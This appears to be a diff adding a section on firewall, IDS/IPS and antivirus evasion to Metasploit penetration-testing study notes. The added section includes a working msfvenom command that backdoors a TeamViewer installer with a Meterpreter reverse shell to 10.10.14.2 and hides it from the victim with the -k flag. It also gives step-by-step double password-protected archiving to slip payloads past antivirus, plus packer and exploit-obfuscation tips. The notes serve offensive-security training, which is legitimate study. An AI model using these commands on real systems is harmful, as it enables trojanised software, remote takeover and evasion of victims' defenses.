@@ -517,3 +517,86 @@ lsa_dump_sam
 lsa_dump_secrets
 ```
 From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.
+
+# Firewall and IDS/IPS Evasion
+
+- **Endpoint Protection**: Protects individual devices or hosts, typically through antivirus, antimalware, firewalls, and anti-DDoS software (e.g., Avast, Malwarebytes).
+- **Perimeter Protection**: Safeguards the network edge with physical/virtual devices, including the DMZ, which houses public-facing servers that interact with both public and internal networks.
+- **Security Policies**: Work like Access Control Lists (ACLs) to allow or deny specific network actions based on various rules for traffic, applications, users, files, etc.
+  
+### Detection Methods:
+- **Signature-based Detection**: Matches traffic against known attack patterns (signatures) to raise alarms.
+- **Heuristic/Statistical Anomaly Detection**: Compares network behavior to a baseline, raising alarms if behavior deviates from the norm.
+- **Stateful Protocol Analysis**: Detects protocol misuse by comparing it to profiles of normal, non-malicious activity.
+- **Live Monitoring (SOC)**: Analysts monitor live traffic and alarms, either manually responding or allowing automated responses.
+
+### Evasion Techniques:
+- **Circumventing AV and IDS/IPS**: Encoding payloads can help avoid detection, but modern security systems often block common payload patterns. Encryption (AES) tunnels in **msfconsole** can also bypass network-based IDS/IPS.
+- **Payload Fingerprinting**: AV software may fingerprint payloads and block them, but **msfvenom** allows the use of executable templates, which can embed shellcode into legitimate programs, making detection harder.
+- **Executable Templates**: Use these to hide payloads within legitimate software, reducing the chance of detection by AV systems.
+
+msfvenom offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them , and use any executable as a platform from which we can launch our attack. 
+```
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+```
+
+When a target runs a backdoored executable, the program usually appears to do nothing, which can make the target suspicious. To avoid this, we can use the -k flag, which allows the real program to keep running normally while the malicious payload runs quietly in the background. However, if the target launches the backdoored file from a command-line interface (CLI), they might see a new window pop up showing the backdoor in action. This window will stay open until we finish interacting with the payload, which can still be a giveaway to the target.
+
+## Archives
+Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. ( Can alarm AV)
+
+**Generating Payload**
+
+```
+ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+```
+If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.
+
+```
+msf-virustotal -k <API key> -f test.js
+```
+Now, try archiving it two times, passwording both archives upon creation, and removing the .rar/.zip/.7z extension from their names.
+
+**Archiving the Payload**
+
+```
+wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+rar a ~/test.rar -p ~/test.js
+```
+**Removing the .RAR Extension**
+
+```
+mv test.rar test
+```
+Archiving the Payload Again
+```
+ rar a test2.rar -p test
+```
+Removing the .RAR Extension
+```
+ mv test2.rar test2
+```
+check with virustotal
+
+
+## Packers
+- **Packer**: Combines an executable, payload, and decompression code into one compressed file. When run, it decompresses and executes like the original program.
+- **Purpose**: Provides protection against file-scanning mechanisms by compressing and hiding the payload.
+- **msfvenom**: Offers file compression, structure modification, and encryption for backdoored executables.
+- **Popular Packer Tools**: UPX packer, The Enigma Protector, MPRESS, ExeStealth, Morphine, Themida, MEW.
+
+## Exploit Coding
+- **Goal**: Make exploit code less identifiable to avoid security detection on target systems.
+- **Buffer Overflow (BoF)**: Standard exploit might be recognized due to hex buffer patterns.
+- **Randomization**: Introduce variation to break IPS/IDS detection signatures.
+- **Example**: Use an offset switch inside the code, like `'Offset' => 5093`.
+- **Avoid NOP Sleds**: NOP sleds (empty instructions before shellcode) are checked by IDS/IPS. Avoid using obvious patterns.
+- **Testing**: Always test custom exploit code in a sandbox environment first.
+- **Book Reference**: Metasploit - The Penetration Tester's Guide from No Starch Press is a good resource for learning exploit creation.
+
+## Recompiling Meterpreter from Source Code
+- **Common Defenses**: Intrusion Prevention Systems (IPS) and Antivirus Engines are designed to block malicious files based on their signatures.
+- **Solution**: Recompiling Meterpreter can help evade these defenses by altering the signature and behavior.
+
+
